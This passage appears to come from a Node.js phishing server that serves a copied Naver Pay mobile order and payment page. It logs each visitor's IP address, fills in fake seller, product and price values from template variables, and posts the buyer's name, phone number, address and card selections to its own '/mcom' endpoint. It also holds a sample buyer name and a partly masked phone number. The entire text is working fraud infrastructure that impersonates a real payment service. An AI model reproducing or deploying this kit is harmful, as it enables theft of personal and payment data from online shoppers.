			function doPay_Bank_Result(resultCode, resultMessage, payKey, authUrl, netCancelUrl, orderNumber, checkAckUrl) {
				var pgCp = bill.variable._returnForm.value("PGCP"); 
				if (pgCp == "04F") {
					bill.variable._returnForm.value('LGD_PAYKEY', payKey);
				}else if(pgCp == "04E") {
					INIStdPay.$modalDiv.modal('hide');
					bill.variable._returnForm.value("MSG", resultMessage);
					bill.variable._returnForm.value('authToken', payKey);
					bill.variable._returnForm.value('authUrl', authUrl);
					bill.variable._returnForm.value('netCancelUrl', netCancelUrl);
					bill.variable._returnForm.value('orderNumber', orderNumber);
					bill.variable._returnForm.value('checkAckUrl', checkAckUrl);
				}
				bill.variable._lastCallbackFn("success");
			}
			
			function doPay_Bank_ResultFail(resultCode, resultMessage) {
				bill.variable._returnForm.value("MSG", resultMessage);
				if(resultMessage != '' ){
					bill.variable._lastCallbackFn("failmsg");	
				}
				var pgCp = bill.variable._returnForm.value("PGCP");
				if (pgCp == "04E") {
					INIStdPay.viewOff();
				}
				
			}
			
			function doPay_Credit_ResultFail(resultCode, resultMessage) {
				bill.variable._returnForm.value("MSG", resultMessage);
				bill.variable._lastCallbackFn("fail");
				INIStdPay.viewOff();
			}
			
			function doPay_Credit_Result(resultCode, resultMessage, authToken, authUrl, netCancelUrl, orderNumber, checkAckUrl) {
				bill.variable._returnForm.value("MSG", resultMessage);
				bill.variable._returnForm.value('authToken', authToken);
				bill.variable._returnForm.value('authUrl', authUrl);
				bill.variable._returnForm.value('netCancelUrl', netCancelUrl);
				bill.variable._returnForm.value('orderNumber', orderNumber);
				bill.variable._returnForm.value('checkAckUrl', checkAckUrl);
				bill.variable._lastCallbackFn("success");
				
				
			}
			
			</script>
			<!--  수정 불가(IFRAME 방식시 사용)   -->
			<div id="LGD_PAYMENTWINDOW" style="position:absolute; display:none; left:0; top:0; width:100%; height:100%; background-color:white; z-index:100 ; font-size:small; ">
				 <iframe id="LGD_PAYMENTWINDOW_IFRAME" name="LGD_PAYMENTWINDOW_IFRAME" height="100%" width="100%" scrolling="auto" frameborder="0" style="background-color:white;" title="내용없음">
				 </iframe>
			</div>
			<div id="INI_PAYMENTWINDOW" style="position:absolute; display:none; left:0; top:0; width:100%; height:100%; background-color:white; z-index:100 ; font-size:small; ">
				 <iframe id="INI_PAYMENTWINDOW_IFRAME" name="INI_PAYMENTWINDOW_IFRAME" height="100%" width="100%" scrolling="no" frameborder="0" style="background-color:white;" title="내용없음">
				 </iframe>
			</div>
			<script type="text/javascript" language="JavaScript" src="http://ssl.pstatic.net/static.checkout/layout/202202231455/js/customer/layout.variable.real.js"></script>
			<script type="text/javascript" language="JavaScript" src="http://ssl.pstatic.net/static.checkout/layout/202202231455/js/customer/layout.gnb.js"></script>
			<script type="text/javascript" language="JavaScript" src="http://ssl.pstatic.net/static.checkout/layout/202202231455/js/customer/layout.lnb.js"></script>
			<script type="text/javascript" language="JavaScript" src="http://ssl.pstatic.net/static.checkout/layout/202202231455/js/customer/checkout.nclktag.js"></script>
			
			</body></html>`
			res.writeHead(200, {'Content-Type':'text/html', 'charset' : 'utf-8'}); 
			res.end(buy); 

		
	} 
	if(req.url == '/mbuy') { // login start
		console.log('[ 정보 ] 모바일 결제창 접속\n\nIP : '+requestIp.getClientIp(req))
		mbuy = `<html data-useragent="Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Mobile Safari/537.36 Edg/99.0.1150.39"><head><style type="text/css" id="_jmc_no_tap_highlight_tag_"></style>
		<link type="text/css" rel="stylesheet" href="http://img.pay.naver.net/o/mstatic/css/service/mobile/component.css?1646915268194">
		<link type="text/css" rel="stylesheet" href="http://img.pay.naver.net/o/mstatic/css/service/mobile/layout.css?1646915268194">
		<link type="text/css" rel="stylesheet" href="http://img.pay.naver.net/o/mstatic/css/service/mobile/ordersheet.css?1646915268194">
		</head><body><form id="orderForm" action="/mcom" name="orderForm" class="_orderForm" method="post">
		<meta charset="utf-8">
		<meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0">
		<meta name="format-detection" content="telephone=no">
		<meta name="referrer" contents="always">
		<meta property="og:title" content="네이버페이">
		<meta property="og:image" content="https://img.pay.naver.net/static/images/customer/og/naverpay.png">
		<meta property="og:description" content="네이버 ID로 간편구매, 네이버페이">
		<!-- 기기 분기처리 스크립트 -->
		
		<title>네이버페이</title>
		<link rel="shortcut icon" type="image/x-icon" href="https://ssl.pstatic.net/static.checkout/layout/202202231455/images/mobile/icon/android_legacy_xxxhpdi_192x192.png">
		<link rel="apple-touch-icon-precomposed" href="https://ssl.pstatic.net/static.checkout/layout/202202231455/images/mobile/icon/android_legacy_xxxhpdi_192x192.png">
		<link type="text/css" rel="stylesheet" href="https://ssl.pstatic.net/static.checkout/layout/202202231455/css/mobile/layout.css">
		
		
		
			<div class="_body" style="display: block;">
				<div id="header">
					<div class="gnb">
						<a href="http://m.pay.naver.com/mobile/home" class="N=a:ode.paylogo absolutev logo_npay">
							<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="60" height="23" viewBox="0 0 60 23">
								<defs>
									<path id="prefix__a" d="M0 23L60 23 60 0 0 0z"></path>
								</defs>
								<g fill="none" fill-rule="evenodd">
									<path fill="#03C75A" d="M30.688 6.563v4.2h2.4c1.587 0 2.551-.495 2.551-2.036v-.33c0-1.45-.964-1.834-2.343-1.834h-2.608zM28.27 4.6h5.14c3.27 0 4.668 1.614 4.668 3.778v.386c0 2.146-1.512 3.98-4.668 3.98h-2.72v5.081h-2.42V4.6zM45.528 13.137h-2.32c-1.243 0-1.677.517-1.677 1.34v.23c0 .688.49 1.09 1.414 1.09 1 0 1.66-.21 2.15-.708.433-.421.433-.88.433-1.665v-.287zm-6.297 1.741v-.612c0-1.722.999-3.004 3.921-3.004h2.376v-.401c0-1.302-.566-1.837-1.848-1.837-1.112 0-2.074.363-2.94 1.052l-1.17-1.76C40.626 7.57 41.927 6.9 43.7 6.9c2.431 0 4.185 1.244 4.185 3.367v7.405h-2.131l-.038-1.301c-.395.937-1.866 1.454-2.96 1.454-2.224 0-3.525-1.09-3.525-2.947zM52.211 6.9L54.529 14.401 54.603 14.401 56.939 6.9 59.423 6.9 54.121 21.275 51.933 20.519 53.249 17.184 49.615 6.9z"></path>
									<mask id="prefix__b" fill="#fff">
										<use xlink:href="#prefix__a"></use>
									</mask>
									<path fill="#03C75A" d="M0 23L23.077 23 23.077 0 0 0z" mask="url(#prefix__b)"></path>
									<path fill="#FFF" d="M16.731 17.25L13.362 17.25 9.298 11.095 9.298 17.25 5.769 17.25 5.769 5.75 9.138 5.75 13.202 11.905 13.202 5.75 16.731 5.75z" mask="url(#prefix__b)"></path>
								</g>
							</svg>
							<span class="blind">네이버페이</span>
						</a>
						<h1 class="pageh1">주문/결제하기</h1>
							<button type="button" class="N=a:ode.close absolutev absoluter" onclick="location.href='http://m.pay.naver.com/mobile/home'">
								<svg xmlns="http://www.w3.org/2000/svg" width="30" height="30" viewBox="0 0 30 30">
									<g fill-rule="evenodd">
										<path d="M17.301 0L0 17.301 0.7 18 18 0.699z" transform="translate(6 6)"></path>
										<path d="M0.699 0L0 0.699 17.3 18 18 17.301z" transform="translate(6 6)"></path>
									</g>
								</svg><span class="blind">화면닫기</span>
							</button>
					</div>
				</div>
				<hr>
				<div id="ct" role="main">
		
		
		
		
		<!-- pg사별 Script -->
			
			
			
			
			
			
		<!-- 결제관련 공통 Script -->
		
		
			
			
			
			
			
			
		
																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																										   
		 <!-- ISP, 현대, NH, 하나, 외환 -->
		
		
		
		
		
		
		
		
		
		
			<input type="hidden" name="donAgree" value="false" class="_donAgree _certificationForm">
			<input type="hidden" name="tempOrderId">
			<input type="hidden" name="prestigeKey" value="" class="_certificationForm">
		
			<input type="hidden" name="fdsUuid" value="" id="fdsUuid" class="_fdsUuid _certificationForm">
			<input type="hidden" name="naverToken" value="" class="_naverToken _certificationForm">
			<input type="hidden" name="isNaverPayPasswordAvailable" value="false" class="_certificationForm">
			<input type="hidden" name="authentificationToken" value="" class="_authentificationToken _certificationForm">
			<input type="hidden" name="mbrsSscYn" value="false" class="_certificationForm">
		
			<div class="ord_cont _productDetail _productInfos _coupon_area">
		
		
		
		
				
			<h3 class="ord_tit_v1">
				<a href="#" class="N=a:ode.delinfo ord_tit_icon tit_ship _click(checkout.mobile.order.order_sheet.toggleForm(_deliveryInfoArea)) _stopDefault">배송지</a>
			</h3>
			<div class="ord_sc _deliveryInfoArea _deliveryInfoType">
		
				<ul class="ord_tabm _tab" style="display:none;">
					<li class="_selectDeliveryPlace "><a href="#" class="N=a:ode.addsel _click(checkout.mobile.order.order_sheet.showAddressTab(SELECT)) _stopDefault">배송지 선택</a></li>
					<li class="_newDeliverPlace on"><a href="#" class="N=a:ode.addnew _click(checkout.mobile.order.order_sheet.showAddressTab(NEW)) _stopDefault">신규 입력</a></li>
				</ul>
				<div class="ord_inr">
					<div class="_deliveryInfos">
						<ul class="_baseDeliveryAddressArea">
						</ul>
						<div class="ship_inp _inputDeliveryAddressArea">
							
							<table cellpadding="0" cellspacing="0" border="0" class="tbl_ord">
								<colgroup><col width="70"><col>
								</colgroup><input type="hidden" name="deliveryAddress.purchaseMemberDeliveryPlaceSeq" value="" class="_deliveryForm">
		
								<tbody><tr>
									<th scope="row">
										<div class="tlb_tit ic_terms1">
											<strong>배송지명</strong>
										</div>
									</th>
									<td>
										<input type="text" placeholder="직접 입력하거나 선택하세요" title="배송지명 입력" maxlength="50" name="deliveryPlaceName" value="" class="inptxt _deliveryForm">
										<div class="delivery_name">
											<div class="name_select">
												<button type="button" class="btn _click(checkout.mobile.order.order_sheet.setDeliveryPlaceName(집))">집</button>
												<button type="button" class="btn _click(checkout.mobile.order.order_sheet.setDeliveryPlaceName(회사))">회사</button>
												<button type="button" class="btn _click(checkout.mobile.order.order_sheet.setDeliveryPlaceName(학교))">학교</button>
												<button type="button" class="btn _click(checkout.mobile.order.order_sheet.setDeliveryPlaceName(친구))">친구</button>
												<button type="button" class="btn _click(checkout.mobile.order.order_sheet.setDeliveryPlaceName(가족))">가족</button>
											</div>
										</div>
									</td>
								</tr>
		
								<tr>
									<th scope="row">
										<div class="tlb_tit ic_terms1">
											<strong>수령인</strong>
											<em class="necessary_mark"><span>필수입력</span></em>
										</div>
									</th>
									<td>
										<input type="text" title="수령인입력" id="inp1" placeholder="50자 이내로 입력하세요" maxlength="50" name="receiverName" class="inptxt _deliveryForm" value="">
									</td>
								</tr>
								<tr>
									<th scope="row">
										<div class="tlb_tit ic_terms1">
											<strong>연락처<em>1</em></strong>
											<em class="necessary_mark"><span>필수입력</span></em>
										</div>
									</th>
									<td>
										<ul class="inp_d">
											<li>
												<div class="slt_bx telNo1_1">
													<select title="휴대폰 첫째자리 선택" name="phonenumber1" class="inpnum _deliveryForm _group_tel1_1 _change(checkout.mobile.order.order_sheet.lazyCheckFirstNumber()) _firstNumber">
															<option value="010">010</option>
															<option value="011">011</option>
															<option value="016">016</option>
															<option value="017">017</option>
															<option value="018">018</option>
															<option value="019">019</option>
															<option value="02">02</option>
															<option value="031">031</option>
															<option value="032">032</option>
															<option value="033">033</option>
															<option value="041">041</option>
															<option value="042">042</option>
															<option value="043">043</option>
															<option value="044">044</option>
															<option value="051">051</option>
															<option value="052">052</option>
															<option value="053">053</option>
															<option value="054">054</option>
															<option value="055">055</option>
															<option value="061">061</option>
															<option value="062">062</option>
															<option value="063">063</option>
															<option value="064">064</option>
															<option value="070">070</option>
															<option value="080">080</option>
															<option value="0130">0130</option>
															<option value="0303">0303</option>
															<option value="0502">0502</option>
															<option value="0503">0503</option>
															<option value="0504">0504</option>
															<option value="0505">0505</option>
															<option value="0506">0506</option>
															<option value="0507">0507</option>
															<option value="0508">0508</option>
															<option value="050">050</option>
															<option value="012">012</option>
															<option value="059">059</option>
													</select>
													<span class="ico"></span>
												</div>
											</li>
											<li>
												<input type="tel" title="휴대폰 둘째자리 입력" name="phonenumber2" class="inptxt inpnum _onlyNumberTarget _deliveryForm _group_tel1_2" maxlength="4" value="" pattern="[0-9]*">
											</li>
											<li>
												<input type="tel" title="휴대폰 셋째자리 입력" name="phonenumber3" class="inptxt inpnum _onlyNumberTarget _deliveryForm _group_tel1_3" maxlength="4" value="" pattern="[0-9]*">
											</li>
										</ul>
									</td>
								</tr>
								
								<tr>
									<th scope="row">
										<div class="tlb_tit ic_terms1">
											<strong>배송지</strong>
											<em class="necessary_mark"><span>필수입력</span></em>
										</div>
									</th>
									<td class="zip">
										
										<div class="address">
											<input type="text" title="주소입력1" name="baseadd" value="" class="inptxt _deliveryForm">
											<input type="text" title="주소입력2" name="inadd" value="" class="inptxt _deliveryForm">
										</div>
										<input type="hidden" name="deliveryAddress.roadNameAddress" value="" class="_deliveryForm">
										<input type="hidden" name="deliveryAddress.lotNumberAddress" value="" class="_deliveryForm">
										<input type="hidden" name="deliveryAddress.roadNameAddressYn" value="false" class="_deliveryForm">
										<p class="addcs _lotNumberAddress" style="display:none;"><span class="pint">지번</span>: </p>
										
									</td>
								</tr>
							</tbody></table>
						</div>
					</div>
		
					<div class="inf_send _deliveryMemoes">
							
						<input type="hidden" name="deliveryMemoParticularInputYn" value="false" class="_inputDeliveryMemo _deliveryForm">
						<ul class="memo _orderMemo">
							<li>
								<div class="slt_bx">
									<select title="선택" class="N=a:ode.click _predefinedDeliveryMemo _change(checkout.mobile.order.order_sheet.applyLatestDeliveryMemo())">
										<option value="" data-value="select">배송메모를 선택해 주세요.</option>
										<option value="">요청사항을 직접 입력합니다.</option>
										<option value="배송 전에 미리 연락 바랍니다.">배송 전에 미리 연락 바랍니다.</option>
										<option value="부재시 경비실에 맡겨 주세요.">부재시 경비실에 맡겨 주세요.</option>
										<option value="부재시 전화 주시거나 문자 남겨 주세요.">부재시 전화 주시거나 문자 남겨 주세요.</option>
									</select>
									<span class="ico"></span>
								</div>
								<textarea title="배송메모 입력" cols="30" rows="5" class="tx_area _deliveryForm _deliveryMemo" name="deliveryMemo" style="display: inline;"></textarea>
							</li>
						</ul>
						<ul class="memo _productMemo" style="display:none">
								<li>
									<h4>
										RGB to HDMI 젠더 변환 VGA to HDM 컨버터 모니터 잭(선택: 01_RGB to HDMI 젠더)
									</h4>
									<div class="slt_bx">
										<select title="선택" name="deliveryMemo" class="N=a:ode.click _predefinedDeliveryMemo _change(checkout.mobile.order.order_sheet.applyLatestDeliveryMemo(2022031427199748))">
											<option value="" data-value="select">배송메모를 선택해 주세요.</option>
											<option value="">요청사항을 직접 입력합니다.</option>
											<option value="배송 전에 미리 연락 바랍니다.">배송 전에 미리 연락 바랍니다.</option>
											<option value="부재시 경비실에 맡겨 주세요.">부재시 경비실에 맡겨 주세요.</option>
											<option value="부재시 전화 주시거나 문자 남겨 주세요.">부재시 전화 주시거나 문자 남겨 주세요.</option>
										</select>
										<span class="ico"></span>
									</div>
									<textarea title="배송메모 입력" cols="30" rows="5" class="tx_area _deliveryForm _deliveryMemo" name="deliveryMemos.2022031427199748" style="display:none;"></textarea>
						</li></ul>
					</div>
		
				</div>
			</div>
				<input type="hidden" class="opt _sellerNames" value="위드잇">
				<input type="hidden" class="opt _overseasDeliverySellerNames" value="">
			<h3 class="ord_tit_v1" id="purchaserInfo">
				<a href="#" class="N=a:ode.buyerinfo ord_tit_icon tit_orderer off _click(checkout.mobile.order.order_sheet.togglePurchaserInfoForm()) _stopDefault">
					주문자
					<span class="summary">아이디(<em class="_memberTelNumber2">`+id+`</em>)</span>
				</a>
			</h3>
			<div class="ord_sc _purchaserInfo" style="display:none;">
				<div class="ord_inr">
					<div class="inf_view inf_view_v1">
						<dl>
						<dt>김민준</dt>
						<dd><em class="_memberTelNumber1 ">010-1**2-5**0</em></dd>
						<dd><em class="_memberEmailAddress">이메일 부분</em></dd>
						</dl>
						<a href="#" class="N=a:ode.now bt_com _ordermemberInfoUpdateBtn _click(checkout.mobile.order.order_sheet.changeMemberSimpleUpdate()) _stopDefault"><span>변경</span></a>
					</div>
					<div class="inf_txt _telNoInfoArea" style="display:none">
						<span class="_telNoNoti _telNoNeedRegistration" style="display:none"><p class="ico_alert"><strong><em>휴대폰 번호를 등록해주세요!</em><br>휴대폰 번호가 등록되지 않으면 정확한 주문/결제 알림을 받지 못할 수 있습니다.</strong></p></span>
						<span class="_telNoNoti _telNoDuplicated" style="display:none"><p class="ico_alert type_red"><strong><em>휴대폰 번호를 확인해주세요!</em><br>현재 등록되어 있는 휴대폰 번호가 다른 사용자에게도 동일하게 등록되어 있습니다.<br>휴대폰 번호가 인증되지 않으면 정확한 주문/결제 알림을 받지 못할 수 있습니다.</strong></p>
					</span></div>
		
					<input type="hidden" name="order.memberName" value="김민준">
					  <input type="hidden" name="order.memberCellPhoneNo" value="010-1**7-2**0">
				</div>
			</div>
		
		<h3 class="ord_tit_v1">
			<a href="#" class="N=a:ode.prodinfo ord_tit_icon _orderProductInfoFold tit_ordproduct _click(checkout.mobile.order.order_sheet.toggleOrderProductInfoFold(_orderProductInfoArea)) _stopDefault">
				주문상품
					<span class="summary _productSummaryTitle"><em class="number">1건</em></span>
				
			</a>
		</h3>
		<div class="_orderProductInfoArea">
				
				<div class="ord_sc">
					<div class="ord_tit_v3">
						<div class="area">
							<div class="inner">
								<div class="p_store_name">
									<h4>
										<a href="#" class="store _stopDefault">
													`+판매자이름+`
										</a>
									</h4>
								</div>
								<div class="ship_amount">
									<span class="icon _deliveryPriceText2022031490966214">
										<em>2500</em>원
									</span>
								</div>
		
							</div>
						</div>
							<div class="notify_area">
											<span class="ico_square send">오늘출발</span>
											<p class="text_notify">오늘출발 마감 (12:00) / 발송예정일 : 오늘</p>
							</div>
					</div>
					
					<div class="ord_inr">
						<ul class="ord_plst">
		
						<li>
							<div class="ord_pdt">
								<a href="https://smartstore.naver.com/main/products/2515203719" class="N=a:ode.image thmb">
		<img src="`+물건이미지+`" alt="RGB to HDMI 젠더 변환 VGA to HDM 컨버터 모니터 잭" width="65" height="65"><span class="loading _loading" style="display: none;"><span class="blind">로딩중...</span></span>						</a>
								<dl>
									<dt>
										<div class="additional_status">
												<span class="ico_npmember type_npay"><span class="blind">네이버플러스 멤버십</span></span>
													<strong class="predict_status point_green">3/16(수) 도착 확률 91%</strong>
										</div>
										<div class="info_seller">
												
													<strong class="name_seller">`+판매자이름+`</strong>
										</div>
										<a href="#" class="N=a:ode.name">
											 `+물건이름+`
										</a>
									</dt>
								<dd>
									<ul>
											<li>
												<span class="ic ic_green">옵션</span>
												<span>선택: `+물건이름+`<span class="number"><em>1</em></span>개</span>
											</li>
		
									</ul>
								</dd>
		
								<input type="hidden" class="_sumSupplementedItem2022031424511601_2022031427199748" value="0">
								<dd class="sum"><em class="_productOrderValue2022031424511601_2022031427199748">`+가격+`</em>원<span class="_productOrderAmountArea2022031424511601_2022031427199748"><span class="blind">판매가</span><em class="_productOrderAmountValue2022031424511601_2022031427199748">`+String(기존가격1)+`</em>원</span></dd>
								</dl>
							</div>
		
							<!-- 상품할인 및 배송비 쿠폰 모두 없을 경우 할인금액영역까지도 미노출 (결제해야할 배송비가 없으면 배송비 쿠폰 영역은 스펙상 미노출됨 -->
		
		
		
							<div class="dic_area">
								<div class="bg_dic">
									<span class="bg_line"></span>
									<span class="im_left"></span>
									<span class="im_right"></span>
								</div>
		
		
							<!-- 배송비 쿠폰은 지역별 추가배송비가 붙는 경우에 주문서 초기 로딩시에는 화면에 안보이다가, 주소 변경 시 노출되는 경우가 있으므로 주의가 필요함 -->
							<!-- 상품할인 쿠폰  -->
								<dl class="reset">
								<dt>상품 할인</dt>
								<dd>
									<ul class="rad_lst">
										<li class="N=a:ode.disco on">
											<input type="radio" id="sellerImmediateDiscount___0___2022031427199748" checked="checked" class="chk_rd _coupon_radio _click(checkout.mobile.order.order_sheet.calculateCouponAmount(immediate))" value="SE_2512426784" name="productMerchantCoupon2022031427199748">
											<label for="sellerImmediateDiscount___0___2022031427199748">
												
												즉시할인
												
												<em class="hls _sellerImmediateDiscountAmount___2022031427199748">
													-`+String(기존가격1-가격1)+`</em>원
											</label>
										</li>
										<li class="N=a:ode.nodis">
											<input type="radio" id="sellerProductDiscount___0___2022031427199748___NoApply" class="chk_rd couponRadio_coupon_radio  _click(checkout.mobile.order.order_sheet.calculateCouponAmount(product))" value="" name="productMerchantCoupon2022031427199748">
											<label for="sellerProductDiscount___0___2022031427199748___NoApply" class="rdolb ">적용안함</label>
										</li>
									</ul>
								</dd>
								</dl>
		
		
		
			
		<div class="_deliveryCouponList _deliveryCouponInfo2022031490966214">
		</div>                         
							</div>
		
		
						</li>
							</ul>
						</div>
		
		
			<div class="multiple_area">
				<div class="total_discount">
					<div class="title">
						주문금액
					</div>
					<p class="area">
						<span class="sum"><span class="num _payAmountAfterDiscount">`+String(가격1+2500)+`</span>원</span>
					</p>
				</div>
			</div>
		</div>
		</div>		<h3 class="ord_tit_v1"></h3>
		<div>
			<!-- 네이버페이 포인트(포인트) -->
			
		
		
		
			<div class="_discountForm" id="_discountFormFocus">
				<div class="ord_point_sc">
					<div class="ord_inr">
						
				</div>
			</div>
		</div>
		<!-- 결제정보 -->
		<h3 class="ord_tit_v1 _paymentInfoTitle" id="_paymentFocus">
			<a href="#" class="N=a:ode.payinfo ord_tit_icon tit_payinfo _click(checkout.mobile.order.order_sheet.toggleForm(_paymentInfoArea)) _stopDefault">
				결제수단
				<span class="point _generalPaymentAmountSpan"><em>`+String(가격1 + 2500)+`</em>원</span>
			</a>
		</h3>
		<div class="_paymentInfoArea">
			<div class="payinfo_section _noPaymentArea" style="display: none">
		<div class="simplepay_cont _click(checkout.mobile.order.order_sheet.showNoPaymentLayer()) _stopDefault">
			<ul class="paymethod_list">
						<li class="paymethod point_charge">
					<div class="radio_area">
						<input type="radio" name="paymethod" id="charge1" class="hidden disabled">
						<label for="charge1" class="radio_label">
							포인트 충전결제
						</label>
					</div>
					<div class="pay_selected" style="display: none;"></div>
				</li>
				<li class="N=a:ode.paymentdimm paymethod">
					<div class="radio_area">
						<input type="radio" name="paymethod" id="account1" class="hidden disabled">
						<label for="account1" class="radio_label">계좌 간편결제</label>
					</div>
					<div class="pay_selected" style="display: none;"></div>
				</li>
				<li class="N=a:ode.paymentdimm paymethod">
					<div class="radio_area">
						<input type="radio" name="paymethod" id="card1" class="hidden disabled">
						<label for="card1" class="radio_label">카드 간편결제</label>
					</div>
					<div class="pay_selected" style="display: none;"></div>
				</li>
				<li class="N=a:ode.paymentdimm paymethod">
					<div class="radio_area">
						<input type="radio" name="paymethod" id="basic1" class="hidden disabled">
						<label for="basic1" class="radio_label">일반결제</label>
					</div>
					<div class="pay_selected" style="display: none;"></div>
				</li>
			</ul>
		</div>	</div>
		
			<span class="_paymentMeansArea" style="display: inline;">
		
				<div class="_payMethodTab">
		
		<div class="payinfo_section _payinfoDiv">
		
		
		
		<div class="error_info guide_layer paymentMethodStatementArea" style="    display:none
		">
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		</div>
		
		
			<div class="simplepay_cont">
				<ul class="paymethod_list _paymentMethodArea">
		
					
		
					
					
		
					<!-- 카드 간편결제 -->
					
					<li class="paymethod">
						<div class="radio_area">
							<input type="radio" name="paymethod" id="basic" data="GENERAL" class="hidden _tabRadioBtn">
							<label for="basic" class="N=a:ode.paygeneral radio_label _payment_label _click(checkout.mobile.order.order_sheet.switchPaymentMethodTab(GENERAL)) _stopDefault">네이버 페이 안전결제</label>
							<span class="price _multiRemainAmount _GENERAL _multiRemainAmountGeneral" style="display:none"><em>-</em>원</span>
						</div>
		
						<div class="pay_selected _paymentTab _generalPaymentTab" style="display: none;">
							<div class="pay_tab_area">
								<ul class="pay_tab">
													<li class="pay_tab_menu">
														<a href="#" class="N=a:ode.card general CREDIT_CARD _payMethod _CREDIT_CARD _click(checkout.mobile.order.order_sheet.changePayMethod(CREDIT_CARD)) _stopDefault">
															<strong>신용카드</strong>
														</a>
													</li>
													<li class="pay_tab_menu">
														<a href="#" class="N=a:ode.cellphone general MOBILE _payMethod _MOBILE _click(checkout.mobile.order.order_sheet.changePayMethod(MOBILE)) _stopDefault">
															<strong>휴대폰</strong>
														</a>
													</li>
										<li class="pay_tab_menu tooltip_area _skipPaymentTab">
											<a href="#" class="N=a:ode.deposit general _payMethod _SKIP _click(checkout.mobile.order.order_sheet.changeSkipPaymentMethod()) _stopDefault"><strong>나중에 결제</strong></a>
											<span class="tooltip_event _skipTooltipEvent" style="display: inline;">
												<span class="edge"></span>
												<p>주문 먼저하고</p>
											</span>
										</li>
								</ul>
							</div>
		<div class="orderwish_area _creditcardTemplate _payMethodForm" style="display:none;">
			
		<div class="commonBannerMobileArea">
		
							<div class="banner_text _bannerDiv _creditCard_commonBanner">
								<a href="https://campaign.naver.com/naverhyundaicard/??eventCode=NAV04&amp;redirect_Url1=https://m.pay.naver.com/o/orderSheet/aa698a50-4f09-4ddd-b540-f9b11e4c656a/integrationCart" class="N=a:ord.nhdcorderapply2">
									<span class="ico_npmember"><span class="blind">네이버플러스 멤버십</span></span>
									<strong class="emph">최대 10% 적립, 네이버 현대카드</strong>
									<span class="arrow_text">혜택 받기</span>
								</a><!--N=a:ord.nhdcorderapply2-->
							</div>
		</div>
			<ul class="radio_list">
				<li class="radio_list_item"><input type="radio" name="cardType" id="creditCard_private" class="hidden _cardType _payForm _click(checkout.mobile.order.order_sheet.integration_cart.changeCardType())" value="PRIVATE" checked="">
					<label for="creditCard_private" class="sp_radio radio_left">개인카드</label>
				</li>
				<li class="radio_list_item"><input type="radio" name="cardType" id="creditCard_corporation" class="hidden _cardType _payForm _click(checkout.mobile.order.order_sheet.integration_cart.changeCardType())" value="CORPORATION">
					<label for="creditCard_corporation" class="sp_radio radio_left">법인카드</label>
				</li>
			</ul>
			<div class="value_select">
				<label for="general1" class="hidden">할부선택</label>
				<select id="general1" name="cardSettleInfo.cardCompanyTypeCode" class="sp_select_icon value2 cardCompanyTypeCode _change(checkout.mobile.order.order_sheet.integration_cart.changeCompanyTypeCode()) _payForm">
					<option value="" selected="selected">카드선택</option>
						<option value="C3">국민</option>
						<option value="C1">비씨</option>
						<option value="C0">신한</option>
						<option value="CH">현대</option>
						<option value="C7">삼성</option>
						<option value="C5">롯데</option>
						<option value="CA">외환</option>
						<option value="C4">NH</option>
						<option value="CF">하나</option>
						<option value="CB">우리</option>
						<option value="C2">광주</option>
						<option value="C9">씨티</option>
						<option value="CC">전북</option>
						<option value="CP">카카오뱅크</option>
						<option value="CQ">케이뱅크</option>
						<option value="CR">UnionPay(銀聯)/해외발급</option>
				</select>
			</div>
			<div class="value_select">
				<label for="general2" class="hidden">할부선택</label>
				<select id="general2" class="sp_select_icon value2 cardInstallmentPeriodClassCode _change(checkout.mobile.order.order_sheet.integration_cart.changeInstallment(_creditcardTemplate)) _payForm _creditCardInstallment" name="freeInterestInstallmentInfo.installmentMonth" disabled="disabled">
					<option value="01">일시불</option>
						<option value="02">2개월</option>
						<option value="03">3개월</option>
						<option value="04">4개월</option>
						<option value="05">5개월</option>
						<option value="06">6개월</option>
						<option value="07">7개월</option>
						<option value="08">8개월</option>
						<option value="09">9개월</option>
						<option value="10">10개월</option>
						<option value="11">11개월</option>
						<option value="12">12개월</option>
						<option value="18" style="display:none;">18개월</option>
						<option value="24" style="display:none;">24개월</option>
						<option value="36" style="display:none;">36개월</option>
				</select>
			</div>
		
			<!-- 일반결제 - 충전결제 유도 배너 -->
			<div class="card_banner_area _chargePointUseGeneralPaymentBanner" style="display: block;">
				<a href="#chargePointScrollArea" class="N=a:ode.general_chargepoint_card charge_banner _click(checkout.mobile.order.order_sheet.activateChargePoint())">
					<p class="banner_text">
						지금 결제수단 변경하면
						<span class="line">
							<strong class="point _chargePointBenefitAmount">최대 311원</strong><span class="sub_text _chargePointBenefitPercent"><span class="bracket">(</span>3%<span class="bracket">)</span></span> 받기 가능!
						</span>
					</p>
					<div class="banner_link">충전결제하기</div>
				</a>
			</div>
		
				<div class="banner_point" id="div-3"></div>
			<input type="hidden" class="_freeInterestInstallmentApplyYn _payForm" name="freeInterestInstallmentInfo.freeInterestInstallmentApplyYn">
			<input type="hidden" class="_freeInterestInstallmentBrdnCoreTypeCode  _payForm" name="freeInterestInstallmentInfo.freeInterestInstallmentBrdnCoreTypeCode">
			<input type="hidden" class="_freeInterestInstallmentSellerCommissionRate _payForm" name="freeInterestInstallmentInfo.freeInterestInstallmentSellerCommissionRate">
			<input type="hidden" class="_freeInterestCommissionAmt _payForm" name="freeInterestInstallmentInfo.freeInterestCommissionAmt">
			<input type="hidden" class="_partFreeInterestBurdenMonths _payForm" name="freeInterestInstallmentInfo.partFreeInterestBurdenMonths">
			<input type="hidden" class="_freeInterestMiniminApplyAmount _payForm" name="freeInterestInstallmentInfo.freeInterestMiniminApplyAmount">
			<input type="hidden" class="_cardInstallmentTypeCode _payForm" name="cardSettleInfo.cardInstallmentTypeCode">
			
			<!-- TODO : 무이자 할부 유형 코드 입력되어야함, 상품, 일반무이자, 유이자, 없음-->
			<input type="hidden" class="_freeInterestInstallmentType _payForm" name="freeInterestInstallmentInfo.freeInterestInstallmentType" value="NON_INSTALLMENT">
		</div>
		<div class="orderwish_area _payMethodForm _mobileTemplate" style="display:none">
			<ul class="radio_list _mobileMethodArea">
							<li class="radio_list_item"><input type="radio" id="payMobilePin" name="payMobilePin" class="hidden _click(checkout.mobile.order.order_sheet.changeMobilePayMethod(MOBILEPIN)) _stopDefault"><label for="payMobilePin" class="sp_radio radio_left">간편결제</label></li>
